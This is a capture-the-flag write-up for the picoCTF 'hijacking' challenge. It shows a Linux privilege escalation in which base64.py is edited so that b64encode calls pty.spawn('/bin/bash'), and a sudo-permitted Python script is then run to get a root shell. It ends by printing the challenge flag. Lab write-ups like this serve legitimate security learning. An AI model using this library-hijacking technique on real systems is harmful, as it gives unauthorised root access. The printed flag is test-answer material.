# hijacking

**200 points**

AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

*Note:* This challenge launches an instance on demand.

___

Wooooooooo python library hijacking!

So, google searching `using python for privilege escalation in linux` I got an [article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) which detailed how to do just that (except the spawning shell part which I got from a youtube video).

Connecting to the server I checked what I can run with sudo with `sudo -l` and got:

```
User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

Cool we can run the script with sudo.

Now inside the script we have an import of `base64`, we could hijack a function used by this library.

I changed the code to just run the commands:

```python
hi = "hi"
out = base64.b64encode(hi.encode('utf-8')).decode('utf-8')

print(out)

```

We need to hijack the function `b64encode` specifically to get root, and we could do so by editing the original library `base64.py`.

The file was located inside `/usr/lib/python3.8/base64.py` so running `vim` on it, I could edit the file.

I imported `pty` and at the start of the function `b64encode`, I added the line:

```python
def b64encode(s, altchars=None):
    """Encode the bytes-like object s using Base64 and return a bytes object.

    Optional altchars should be a byte string of length 2 which specifies an
    alternative alphabet for the '+' and '/' characters.  This allows an
    application to e.g. generate url or filesystem safe Base64 strings.
    """
    pty.spawn('/bin/bash')
    
    #code...
```

Finally, we can run the file with `sudo /usr/bin/python3 /home/picoctf/.server.py` got me a root shell!

Going into the directory `/challenge` and catting the file gives the flag:

> picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}
